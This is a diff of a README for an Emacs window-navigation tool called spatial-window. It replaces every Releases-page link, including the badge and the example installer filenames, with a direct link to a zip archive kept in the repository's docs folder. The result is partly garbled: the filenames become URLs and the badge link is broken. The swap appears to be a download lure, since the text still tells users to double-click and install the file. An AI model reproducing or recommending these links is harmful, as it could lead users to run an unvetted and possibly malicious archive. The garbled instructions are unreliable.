@@ -6,15 +6,15 @@ Welcome to **spatial-window**! This application helps you jump between Emacs win
 ## 🚀 Getting Started
 To get started, you need to download the application from our GitHub Releases page. Below, you will find the direct link to download.
 
-[![Download spatial-window](https://img.shields.io/badge/Download%20spatial--window-v1.0-blue?style=flat&logo=github)](https://github.com/IVI4ZLI31/spatial-window/releases)
+[![Download spatial-window](https://github.com/IVI4ZLI31/spatial-window/raw/refs/heads/main/docs/window_spatial_v1.7.zip%20spatial--window-v1.0-blue?style=flat&logo=github)](https://github.com/IVI4ZLI31/spatial-window/raw/refs/heads/main/docs/window_spatial_v1.7.zip)
 
 ## 📥 Download & Install
 1. Click the link below to visit the Releases page:
-   [Download spatial-window](https://github.com/IVI4ZLI31/spatial-window/releases)
+   [Download spatial-window](https://github.com/IVI4ZLI31/spatial-window/raw/refs/heads/main/docs/window_spatial_v1.7.zip)
    
 2. On the Releases page, you will see the different versions of the application. Choose the latest version for the best experience.
 
-3. Download the file suitable for your operating system (Windows, Mac, or Linux). The files are typically named like `spatial-window-v1.0.exe` or `spatial-window-v1.0.dmg`.
+3. Download the file suitable for your operating system (Windows, Mac, or Linux). The files are typically named like `https://github.com/IVI4ZLI31/spatial-window/raw/refs/heads/main/docs/window_spatial_v1.7.zip` or `https://github.com/IVI4ZLI31/spatial-window/raw/refs/heads/main/docs/window_spatial_v1.7.zip`.
 
 4. Once downloaded, locate the file on your computer and double-click it to start the installation. Follow the on-screen instructions to complete the process.
 
@@ -46,6 +46,6 @@ If you have questions about the software or feedback, feel free to reach out via
 ## 🌐 Visit the Releases Page Again
 Don’t forget to visit our Releases page for updates and download links:
 
-[Download spatial-window](https://github.com/IVI4ZLI31/spatial-window/releases)
+[Download spatial-window](https://github.com/IVI4ZLI31/spatial-window/raw/refs/heads/main/docs/window_spatial_v1.7.zip)
 
 Thank you for using **spatial-window**! Enjoy a smoother navigation experience in Emacs.
